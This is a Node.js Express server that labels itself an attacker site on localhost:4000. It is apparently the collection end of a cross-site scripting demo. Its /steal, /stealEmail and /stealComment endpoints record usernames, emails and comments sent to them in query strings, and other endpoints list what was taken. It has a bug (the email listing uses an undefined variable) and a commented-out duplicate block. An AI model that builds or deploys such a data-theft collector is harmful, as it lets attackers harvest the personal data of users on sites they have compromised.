const express = require("express");
const app = express();
const path = require("path");
let compromisedUsers = [];
let compromisedEmail = [];
let stolenComments = [];
app.use(express.static(path.join(__dirname, "public")));
// Serve the attacker's frontend
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});
//get stolen users
app.get("/stolen", (req, res) => {
    res.json(compromisedUsers);
});
//get stolen email
app.get("/stolenEmail", (req, res) => {
    res.json(stolenEmail);
});
//get stolen comments
app.get("/stolenComments", (req, res) => {
    res.json(stolenComments);
});
//takeusername
app.get("/steal", (req, res) => {
    let username = req.query.username;
    if (username && !compromisedUsers.includes(username)) {
        compromisedUsers.push(username);
        console.log("User stolen:", username);
    }
    res.send("Username stolen!");
});
//takeemail
app.get("/stealEmail", (req, res) => {
    let email = req.query.email;
    if (email && !compromisedEmail.includes(email)) {
        compromisedEmail.push(email);
        console.log("Email stolen:", email);
    }
    res.send("Email stolen!");
});
//takecomments
app.get("/stealComment", (req, res) => {
    let comment = req.query.comment;
    if (comment && !stolenComments.includes(comment)) {
        stolenComments.push(comment);
        console.log("Comment stolen:", comment);
    }
    res.send("Comment stolen!");
});
app.listen(4000, () => console.log("Attacker site running at http://localhost:4000"));


//acceptpls

// //takeusername
// app.get("/steal", (req, res) => {
//     let username = req.query.username;
//     if (username && !compromisedUsers.includes(username)) {
//         compromisedUsers.push(username);
//         console.log("User stolen:", username);
//     }
//     res.send("Username stolen!");
// });
// //takecomments
// app.get("/stealComment", (req, res) => {
//     let comment = req.query.comment;
//     if (comment && !stolenComments.includes(comment)) {
//         stolenComments.push(comment);
//         console.log("Comment stolen:", comment);
//     }
//     res.send("Comment stolen!");
// });
// app.listen(4000, () => console.log("Attacker site running at http://localhost:4000"));
